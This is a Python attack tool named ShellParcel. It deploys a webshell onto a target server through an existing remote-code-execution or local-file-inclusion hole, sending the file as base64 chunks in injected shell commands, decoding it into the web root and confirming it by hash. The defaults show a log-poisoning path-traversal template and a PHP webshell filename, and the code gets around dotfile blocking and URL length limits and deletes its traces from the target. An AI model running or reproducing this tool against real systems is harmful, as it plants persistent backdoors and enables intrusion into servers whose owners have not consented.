#!/usr/bin/env python3
"""
ShellParcel - Idempotent Chunked Webshell Deployer (Audited & Hardened)
A file-transfer utility that retrieves file contents through an existing webshell/RCE.
Bypasses HTTP 414 URI Too Long, multi-spawn race conditions, blind RCE limitations, and restricted environments.
"""

import argparse
import sys
import os
import time
import base64
import urllib.parse
import requests
import hashlib

try:
    import pyfiglet
    from colorama import Fore, Style, init
except ImportError:
    print("Missing dependencies. Install them using: pip install pyfiglet colorama requests")
    sys.exit(1)

init(autoreset=True)

BANNER = pyfiglet.figlet_format("ShellParcel", font="slant")
CREDIT = "Made By Aryan Giri | giriaryan694-a11y"

def print_banner():
    print(Fore.CYAN + BANNER)
    print(Fore.YELLOW + Style.BRIGHT + CREDIT.center(80) + "\n")

def get_interactive_input(prompt, default):
    val = input(f"{Fore.CYAN}{prompt} {Fore.YELLOW}[{default}]{Fore.WHITE}: ").strip()
    return val if val else default

def send_cmd(url, wsp, cmd):
    """Sends command via RCE and returns the response object. Returns None on HTTP failure."""
    encoded_cmd = urllib.parse.quote(cmd, safe='')
    exploit_url = f"{url}{wsp.replace('$SP$', encoded_cmd)}"
    try:
        resp = requests.get(exploit_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        return resp
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}[-] HTTP Failure: {e}")
        return None

def fetch_status(base_url, filename):
    """Fetches a status or hash file from the web root for blind RCE verification."""
    target_url = f"{base_url.rstrip('/')}/{filename}"
    try:
        resp = requests.get(target_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        if resp.status_code == 200:
            return resp.text.strip()
        return None
    except Exception:
        return None

def build_verify_size_cmd(tmp_dir, web_root, status_file, expected_size, total_chunks):
    """Generates POSIX-compliant shell command to verify chunk sizes with fallbacks."""
    return (
        f"expected={expected_size}; actual=0; "
        f"i=0; while [ $i -le {total_chunks-1} ]; do "
        f"f=\"{tmp_dir}/.sp_c_$(printf \"%04d\" $i)\"; "
        f"if [ -f \"$f\" ]; then "
        # Fallbacks for wc: stat (GNU/BSD) -> ls
        f"sz=$(wc -c < \"$f\" 2>/dev/null || stat -c %s \"$f\" 2>/dev/null || stat -f %z \"$f\" 2>/dev/null || ls -l \"$f\" | awk '{{print $5}}'); "
        f"actual=$((actual + sz)); "
        f"fi; "
        f"i=$((i+1)); done; "
        f"if [ \"$actual\" -eq \"$expected\" ]; then echo \"OK\" > \"{web_root}/{status_file}\"; "
        f"else echo \"FAIL_$actual\" > \"{web_root}/{status_file}\"; fi"
    )

def build_decode_cmd(tmp_dir, web_root, remote_path, hash_file, status_file, total_chunks):
    """Generates POSIX-compliant shell command to decode and hash with extensive fallbacks."""
    return (
        f"i=0; while [ $i -le {total_chunks-1} ]; do "
        f"f=\"{tmp_dir}/.sp_c_$(printf \"%04d\" $i)\"; "
        # Fallbacks for cat: sed -> awk -> head
        f"[ -f \"$f\" ] && (cat \"$f\" 2>/dev/null || sed -n 'p' \"$f\" 2>/dev/null || awk 1 \"$f\" 2>/dev/null || head -c 1000000000 \"$f\" 2>/dev/null); "
        f"i=$((i+1)); done | "
        # Fallbacks for base64: openssl -> python3 -> python2 -> perl
        f"(base64 -d 2>/dev/null || openssl base64 -d 2>/dev/null || python3 -c 'import base64,sys;sys.stdout.buffer.write(base64.b64decode(sys.stdin.read()))' 2>/dev/null || python -c 'import base64,sys;sys.stdout.write(base64.b64decode(sys.stdin.read()))' 2>/dev/null || perl -MMIME::Base64 -ne 'print decode_base64($_)' 2>/dev/null) > \"{remote_path}\" 2>/dev/null; "
        f"if [ $? -eq 0 ]; then "
        # Fallbacks for sha256sum: shasum -> openssl -> sha256
        f"h=$(sha256sum \"{remote_path}\" 2>/dev/null || shasum -a 256 \"{remote_path}\" 2>/dev/null || openssl dgst -sha256 \"{remote_path}\" 2>/dev/null | awk '{{print $NF}}' || sha256 \"{remote_path}\" 2>/dev/null); "
        f"echo \"$h\" | awk '{{print $1}}' > \"{web_root}/{hash_file}\" && echo \"OK\" > \"{web_root}/{status_file}\"; "
        f"else echo \"DECODE_FAIL\" > \"{web_root}/{status_file}\"; fi"
    )

def run_logic_tests():
    """Automated test suite simulating blind RCE execution against a local filesystem."""
    import unittest
    import subprocess
    import tempfile
    import shutil

    class TestShellParcelLogic(unittest.TestCase):
        def setUp(self):
            self.tmp_dir = tempfile.mkdtemp()
            self.web_root = tempfile.mkdtemp()
            
        def tearDown(self):
            shutil.rmtree(self.tmp_dir)
            shutil.rmtree(self.web_root)

        def run_bash(self, cmd):
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=self.tmp_dir)
            return res.returncode, res.stdout.strip(), res.stderr.strip()

        def test_file_transfer(self, file_content, chunk_size=500):
            filename = "testfile.bin"
            remote_path = os.path.join(self.web_root, filename)
            status_file = "sp_status.txt"
            hash_file = "sp_hash.txt"
            
            self.run_bash(f"rm -rf {self.tmp_dir}/.sp_l_* {self.tmp_dir}/.sp_c_* {self.web_root}/{status_file} 2>/dev/null")
            
            payload = base64.b64encode(file_content).decode()
            chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
            total_chunks = len(chunks)
            
            for i, chunk in enumerate(chunks):
                lock_dir = f"{self.tmp_dir}/.sp_l_{i:04d}"
                chunk_file = f"{self.tmp_dir}/.sp_c_{i:04d}"
                cmd = f"mkdir {lock_dir} 2>/dev/null && printf '%s' '{chunk}' > {chunk_file}"
                self.run_bash(cmd)
                self.run_bash(cmd) # Idempotency check
                with open(chunk_file, "r") as f:
                    self.assertEqual(f.read(), chunk, "Idempotency failed: chunk corrupted")

            verify_cmd = build_verify_size_cmd(self.tmp_dir, self.web_root, status_file, len(payload), total_chunks)
            self.run_bash(verify_cmd)
            with open(os.path.join(self.web_root, status_file), "r") as f:
                self.assertEqual(f.read().strip(), "OK", "Size verification failed")

            decode_cmd = build_decode_cmd(self.tmp_dir, self.web_root, remote_path, hash_file, status_file, total_chunks)
            self.run_bash(decode_cmd)
            with open(os.path.join(self.web_root, status_file), "r") as f:
                self.assertEqual(f.read().strip(), "OK", "Decode failed")

            with open(os.path.join(self.web_root, hash_file), "r") as f:
                remote_hash = f.read().strip()
            local_hash = hashlib.sha256(file_content).hexdigest()
            self.assertEqual(remote_hash, local_hash, "SHA-256 mismatch")

        def test_empty_file(self): self.test_file_transfer(b"")
        def test_binary_file(self): self.test_file_transfer(os.urandom(1024 * 50))
        def test_large_file(self): self.test_file_transfer(os.urandom(1024 * 1024 * 2), chunk_size=1000)

        def test_malformed_input(self):
            file_content = b"test"
            payload = base64.b64encode(file_content).decode()
            chunk_size = 2
            chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
            total_chunks = len(chunks)
            self.run_bash(f"mkdir {self.tmp_dir}/.sp_l_0000 2>/dev/null && printf '%s' '{chunks[0]}' > {self.tmp_dir}/.sp_c_0000")
            
            verify_cmd = build_verify_size_cmd(self.tmp_dir, self.web_root, "sp_status.txt", len(payload), total_chunks)
            self.run_bash(verify_cmd)
            with open(os.path.join(self.web_root, "sp_status.txt"), "r") as f:
                status = f.read().strip()
                self.assertTrue(status.startswith("FAIL"), f"Should have detected missing chunk, got: {status}")

    print(f"{Fore.YELLOW}[*] Running automated logic tests...")
    suite = unittest.TestLoader().loadTestsFromTestCase(TestShellParcelLogic)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    if result.wasSuccessful():
        print(f"{Fore.GREEN}[+] All logic tests passed!")
    else:
        print(f"{Fore.RED}[-] Some logic tests failed.")
    sys.exit(0 if result.wasSuccessful() else 1)

def main():
    parser = argparse.ArgumentParser(
        description="ShellParcel: An idempotent, chunked file transfer utility for deploying webshells via RCE.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  Interactive mode:
    python3 shellparcel.py

  CLI mode:
    python3 shellparcel.py -url http://10.10.77.157/ -wsp "?view=dog/../../../../../../var/log/apache2/access.log&ext&c=$SP$" -tp /var/www/html/ -tf ary_webshell.php

  Run automated tests:
    python3 shellparcel.py -test
"""
    )

    parser.add_argument("-url", "--url", help="Target URL (e.g., http://10.10.77.157/)")
    parser.add_argument("-wsp", "--wsp", help="Webshell parameter template. Use $SP$ as injection point")
    parser.add_argument("-tp", "--tp", help="Target web path (e.g., /var/www/html/)")
    parser.add_argument("-tf", "--tf", help="Local target file to upload")
    parser.add_argument("-cs", "--chunk-size", type=int, default=500, help="Chunk size in characters (default: 500)")
    parser.add_argument("-enc", "--encoding", default="base64", help="Encoding method (default: base64)")
    parser.add_argument("-test", "--test", action="store_true", help="Run automated logic tests")

    print_banner()
    args = parser.parse_args()

    if args.test:
        run_logic_tests()

    if len(sys.argv) == 1:
        print(f"{Fore.GREEN}[*] No arguments provided. Entering Interactive Mode...\n")
        url = get_interactive_input("Target URL", "http://10.10.77.157/")
        wsp = get_interactive_input("Webshell Parameter Template", "?view=dog/../../../../../../var/log/apache2/access.log&ext&c=$SP$")
        tp = get_interactive_input("Target Web Path", "/var/www/html/")
        tf = get_interactive_input("Local File to Upload", "ary_webshell.php")
        chunk_size = int(get_interactive_input("Chunk Size", "500"))
        encoding = get_interactive_input("Encoding", "base64")
    else:
        url = args.url
        wsp = args.wsp
        tp = args.tp
        tf = args.tf
        chunk_size = args.chunk_size
        encoding = args.encoding

        if not all([url, wsp, tp, tf]):
            print(f"{Fore.RED}[-] Missing required arguments in CLI mode. Use --help for usage.")
            sys.exit(1)

    if "$SP$" not in wsp:
        print(f"{Fore.RED}[-] Webshell Parameter Template (-wsp) must contain '$SP$' as the injection point.")
        sys.exit(1)

    # Intelligent URL Parsing for Base URL (Fixes PATH_INFO routing issues)
    parsed_url = urllib.parse.urlparse(url)
    path_parts = parsed_url.path.split('/')
    if path_parts[-1] and '.' in path_parts[-1]:
        base_path = '/'.join(path_parts[:-1])
    else:
        base_path = parsed_url.path
    base_url = urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, base_path, '', '', ''))

    if not wsp.startswith('?') and not wsp.startswith('/'):
        wsp = '/' + wsp
    
    remote_filename = os.path.basename(tf)
    remote_path = tp.rstrip('/') + '/' + remote_filename
    web_root = os.path.dirname(remote_path)
    
    # Use non-dotfiles to bypass Nginx/Apache dotfile blocking rules
    status_file = f"sp_status_{remote_filename}.txt"
    hash_file = f"sp_hash_{remote_filename}.txt"
    temp_b64_file = f"/tmp/.sp_b64_{remote_filename}"

    if not os.path.exists(tf):
        print(f"{Fore.RED}[-] Local file '{tf}' not found.")
        sys.exit(1)

    with open(tf, "rb") as f:
        file_content = f.read()

    local_hash = hashlib.sha256(file_content).hexdigest()

    if encoding.lower() == 'base64':
        payload = base64.b64encode(file_content).decode()
    else:
        print(f"{Fore.RED}[-] Unsupported encoding: {encoding}. Currently only 'base64' is supported.")
        sys.exit(1)

    print(f"{Fore.GREEN}[+] Read {len(file_content)} bytes from '{tf}' (SHA-256: {local_hash[:16]}...)")
    print(f"{Fore.GREEN}[+] Encoded payload size: {len(payload)} chars")

    transfer_success = False
    verification_success = None
    verification_method = "None"

    # Step 0: Cleanup
    print(f"{Fore.YELLOW}[*] Clearing temp files and locks on target...")
    cleanup_cmd = f"rm -rf /tmp/.sp_l_* /tmp/.sp_c_* \"{temp_b64_file}\" \"{remote_path}\" \"{web_root}/{hash_file}\" \"{web_root}/{status_file}\" 2>/dev/null"
    send_cmd(url, wsp, cleanup_cmd)
    time.sleep(1.5)

    # Step 1: Chunking (Atomic Locking)
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    total_chunks = len(chunks)
    print(f"{Fore.YELLOW}[*] Splitting into {total_chunks} chunks of {chunk_size} chars...")

    for i, chunk in enumerate(chunks):
        lock_dir = f"/tmp/.sp_l_{i:04d}"
        chunk_file = f"/tmp/.sp_c_{i:04d}"
        
        cmd = f"mkdir {lock_dir} 2>/dev/null && printf '%s' '{chunk}' > {chunk_file}"
        
        print(f"{Fore.CYAN}    -> Sending chunk {i+1}/{total_chunks}...{Style.RESET_ALL}", end="\r")
        resp = send_cmd(url, wsp, cmd)
        if resp is None:
            print(f"\n{Fore.RED}[-] HTTP Failure at chunk {i+1}")
            sys.exit(1)
        
        time.sleep(0.3)

    print(f"\n{Fore.GREEN}[+] All {total_chunks} chunks uploaded.                    ")
    transfer_success = True

    # Step 2: Pre-decode Verification (Interrupted-transfer recovery)
    print(f"{Fore.YELLOW}[*] Verifying chunk integrity on target...")
    verify_size_cmd = build_verify_size_cmd("/tmp", web_root, status_file, len(payload), total_chunks)
    send_cmd(url, wsp, verify_size_cmd)
    time.sleep(1.0)
    
    status = fetch_status(base_url, status_file)
    if status == "OK":
        print(f"{Fore.GREEN}[+] All chunks verified on target. Size matches expected payload.")
    elif status is None:
        print(f"{Fore.YELLOW}[!] Could not verify size via HTTP (blind RCE/restricted webroot). Proceeding with decode...")
    else:
        print(f"{Fore.RED}[-] Integrity Failure: Incomplete transfer detected. Status: {status}")
        sys.exit(1)

    # Step 3: Decode and Hash
    print(f"{Fore.YELLOW}[*] Decoding payload to {remote_path}...")
    decode_cmd = build_decode_cmd("/tmp", web_root, remote_path, hash_file, status_file, total_chunks)
    
    resp = send_cmd(url, wsp, decode_cmd)
    if resp is None:
        print(f"{Fore.RED}[-] Execution Failure: Failed to send decode command.")
        sys.exit(1)
        
    time.sleep(1.5)

    status = fetch_status(base_url, status_file)
    if status == "OK":
        print(f"{Fore.GREEN}[+] Base64 decoded successfully on target.")
    elif status == "DECODE_FAIL":
        print(f"{Fore.RED}[-] Execution Failure: Base64 decoding failed on target.")
        sys.exit(1)
    elif status is None:
        print(f"{Fore.YELLOW}[!] Could not verify decode status via HTTP. Proceeding to final hash check...")
    else:
        print(f"{Fore.RED}[-] Execution Failure: Unexpected status: {status}")
        sys.exit(1)

    # Step 4: Final Cryptographic Verification
    print(f"{Fore.YELLOW}[*] Performing SHA-256 verification...")
    remote_hash = fetch_status(base_url, hash_file)
    
    if remote_hash and remote_hash == local_hash:
        verification_success = True
        verification_method = "SHA-256 Match"
    elif remote_hash:
        verification_success = False
        verification_method = "SHA-256 Mismatch"
    else:
        print(f"{Fore.YELLOW}[!] Could not fetch remote hash. Falling back to HTTP status check...")
        try:
            verify_resp = requests.get(f"{base_url}/{remote_filename}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
            if verify_resp.status_code == 200:
                verification_success = True
                verification_method = "HTTP 200 OK"
            elif verify_resp.status_code == 403:
                verification_success = True
                verification_method = "HTTP 403 Forbidden (Exists)"
            else:
                verification_success = False
                verification_method = f"HTTP {verify_resp.status_code}"
        except Exception as e:
            print(f"{Fore.RED}[-] Verification error: {e}")
            verification_success = None
            verification_method = "Network Error"

    # Cleanup temp files on target
    print(f"{Fore.YELLOW}[*] Cleaning up temporary chunk files...")
    cleanup_cmd = f"rm -rf /tmp/.sp_l_* /tmp/.sp_c_* \"{temp_b64_file}\" \"{web_root}/{status_file}\" 2>/dev/null"
    send_cmd(url, wsp, cleanup_cmd)

    # Final Report (Separating Transfer vs Verification)
    print(f"\n{'='*60}")
    print(f"{Fore.CYAN}FINAL REPORT{Style.RESET_ALL}")
    print(f"{'='*60}")
    if transfer_success:
        print(f"{Fore.GREEN}[+] Transfer Status: SUCCESS")
    else:
        print(f"{Fore.RED}[-] Transfer Status: FAILED")
        
    if verification_success is True:
        print(f"{Fore.GREEN}[+] Verification Status: SUCCESS ({verification_method})")
    elif verification_success is False:
        print(f"{Fore.RED}[-] Verification Status: FAILED ({verification_method})")
    else:
        print(f"{Fore.YELLOW}[!] Verification Status: UNKNOWN (Blind RCE / Restricted Webroot)")
    print(f"{'='*60}\n")

    if verification_success is False:
        sys.exit(1)

if __name__ == "__main__":
    main()
